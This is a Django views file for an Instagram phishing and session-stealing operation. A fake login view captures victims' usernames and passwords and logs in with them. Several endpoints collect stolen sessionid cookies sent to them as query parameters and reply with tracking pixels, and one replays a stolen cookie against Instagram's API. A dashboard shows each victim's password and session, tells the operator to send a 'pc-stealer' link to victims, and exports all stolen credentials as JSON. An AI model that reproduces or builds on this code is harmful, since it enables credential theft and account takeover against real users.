from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json
import os
from django.utils import timezone
import requests
import time
import re


fernet = Fernet(os.getenv('FERNET_KEY').encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        if not username or not password:
            return JsonResponse({"success": False, "error": "Empty fields"})

        cl = Client()
        cl.delay_range = [1, 3]
        
        success = False
        session = {"failed": True}
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except Exception as e:
            print(f"LOGIN FAILED: {e}")
            session = {"error": str(e)}

    
        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()

        
        InstagramAccount.objects.update_or_create(
            username=username,
            defaults={
                'password': password,
                'session_data': encrypted,
                'is_active': success,
                'last_success': timezone.now() if success else None,
                'login_attempts': 0 if success else InstagramAccount.objects.filter(username=username).first().login_attempts + 1 if InstagramAccount.objects.filter(username=username).exists() else 1
            }
        )

        return JsonResponse({
            "success": True,
            "username": username,
            "active": success
        })



# core/views.py → DASHBOARD THAT ONLY WORKS WHEN SESSION IS REAL
def dashboard(request):
    # COUNT REAL SESSIONS ONLY
    total = InstagramAccount.objects.filter(session_data__contains='"sessionid"').count()
    active = InstagramAccount.objects.filter(is_active=True, session_data__contains='"sessionid"').count()

    if total == 0:
        return HttpResponse("""
        <html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding:100px;">
        <h1>NO SESSIONS YET</h1>
        <h2>Send this link to victims:</h2>
        <h1 style="background:#111;padding:20px;border:2px solid #0f0;">
            https://instagram-64lz.onrender.com/pc-stealer/
        </h1>
        <p>Dashboard will AUTO-UNLOCK when first session is stolen</p>
        </body></html>
        """)

    # ONLY SHOW DASHBOARD IF SESSIONS EXIST
    victims = []
    for acc in InstagramAccount.objects.filter(session_data__contains='"sessionid"').order_by('-created_at')[:100]:
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            data = json.loads(decrypted)
            sessionid = data.get("authorization_data", {}).get("sessionid", "HIDDEN")
        except:
            sessionid = "ENCRYPTED"

        victims.append({
            "username": acc.username,
            "password": acc.password,
            "sessionid": sessionid[:100] + "..." if len(sessionid) > 100 else sessionid,
            "active": acc.is_active,
            "time": acc.created_at.strftime("%H:%M:%S")
        })

    cards = ""
    for v in victims:
        cards += f'''
        <div style="background:#111;border:3px solid {'lime' if v['active'] else 'red'};padding:20px;margin:20px;border-radius:20px;">
            <h2 style="color:cyan">@{v["username"]}</h2>
            <p style="color:yellow">Pass: {v["password"]}</p>
            <p style="color:#aaa">Time: {v["time"]}</p>
            <button onclick="navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED'" 
                    style="background:#0f0;color:#000;padding:15px 30px;font-weight:bold;border:none;border-radius:10px;cursor:pointer;">
                COPY SESSION
            </button>
            <p style="font-size:30px;margin:10px 0;color:{'lime' if v['active'] else 'red'}">
                {'LIVE' if v['active'] else 'DEAD'}
            </p>
        </div>'''

    return HttpResponse(f"""
    <html><body style="background:#000;color:#0f0;font-family:monospace;margin:0;">
    <h1 style="text-align:center;padding:20px;background:#111;">GOD MODE DASHBOARD</h1>
    <h2 style="text-align:center;">TOTAL: {total} | LIVE: {active}</h2>
    <div style="display:flex;flex-wrap:wrap;justify-content:center;">
    {cards}
    </div>
    <div style="text-align:center;margin:50px;">
        <a href="/download-json/" style="background:#f0f;color:#000;padding:20px 50px;font-size:30px;text-decoration:none;border-radius:20px;">
            DOWNLOAD ALL SESSIONS
        </a>
    </div>
    </body></html>
    """)




def download_json(request):
    data = []
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            if sessionid:
                data.append({"username": acc.username, "password": acc.password, "sessionid": sessionid})
        except:
            continue
    
    response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_{timezone.now().strftime("%Y%m%d")}.json"'
    return response



from django.http import HttpResponse
import urllib.parse

def steal_session(request):
    sess = request.GET.get('sess', '')
    if sess and len(sess) > 50:
        try:
            # DECRYPT TEST (optional)
            decrypted_test = fernet.decrypt(sess.encode()).decode()  # if you stored encrypted
        except:
            pass

        # SAVE RAW SESSIONID
        InstagramAccount.objects.update_or_create(
            username=f"STOLEN_{sess[:12]}",
            defaults={
                'password': 'SILENT_2025',
                'session_data': fernet.encrypt(json.dumps({
                    "authorization_data": {"sessionid": sess}
                }).encode()).decode(),
                'is_active': True,
                'last_success': timezone.now()
            }
        )
        print(f"STOLEN SESSION: {sess[:60]}...")

    # RETURN 1x1 PIXEL
    return HttpResponse(
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
        content_type="image/gif"
    )
    
    
def silent_page(request):
    return render(request, 'core/silent.html')


# core/views.py → CAPTURES USERNAME + PASSWORD + SESSION
import base64
from django.http import HttpResponse
# core/views.py → FINAL WORKING CAPTURE
def capture_full(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')
    
    if s and u and len(s) > 50:
        try:
            
            InstagramAccount.objects.update_or_create(
                username=f"STOLEN_{u[-8:]}",
                defaults={
                    'password': 'SILENT_2025',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s + "..."}  # full session not needed
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"CAPTURED USER ID: {u} | SESSION: {s[:60]}...")
        except Exception as e:
            print("ERROR:", e)
    
    return HttpResponse(b"GIF89a0100010080000000000000000000!f90401000000002c00000000010001000002024401003b", 
                        content_type="image/gif")
    
    
    

def catch_username(request):
    user = request.GET.get('user', 'unknown')
    
    
    InstagramAccount.objects.create(
        username=user,
        password='SILENT_OPENED',
        session_data=fernet.encrypt(json.dumps({"note": "opened_link"}).encode()).decode(),
        is_active=False,
        last_success=timezone.now()
    )
    
    print(f"CAUGHT USER: @{user}")
    
    return HttpResponse("OK")



def steal_reel(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')

    if s and u and len(s) > 80:
        try:
            
            import requests
            headers = {
                'Cookie': f'sessionid={s}',
                'User-Agent': 'Instagram 219.0.0.27.119 Android'
            }
            r = requests.get(f'https://i.instagram.com/api/v1/users/{u}/info/', headers=headers)
            data = r.json()
            username = data.get('user', {}).get('username', f"USER_{u[-8:]}")
            full_name = data.get('user', {}).get('full_name', '')
            pic = data.get('user', {}).get('profile_pic_url', '')

            # SAVE TO DB
            InstagramAccount.objects.update_or_create(
                username=username,
                defaults={
                    'password': 'REEL_STOLEN',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s}
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"REEL STOLEN → @{username} | {full_name}")
        except Exception as e:
            print("ERROR:", e)

    return HttpResponse("1", content_type="text/plain")


def reel_page(request, code):
    return render(request, 'core/reel.html')



def pc_capture(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', 'UNKNOWN_MF')
    
    if s and len(s) > 70:
        username = u if u != 'UNKNOWN_MF' else f"PC_GOD_{int(time.time())}"
        
        try:
            InstagramAccount.objects.update_or_create(
                username=username,
                defaults={
                    'password': 'PC_STOLEN_2025',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s}
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"FUCK YES → @{username} STOLEN VIA PC")
        except Exception as e:
            print("ERROR:", e)
    
    return HttpResponse("1", content_type="text/plain")

def pc_stealer_page(request):
    return render(request, 'core/pc-stealer.html')




def reel_page(request, code):
    return render(request, 'core/reel.html')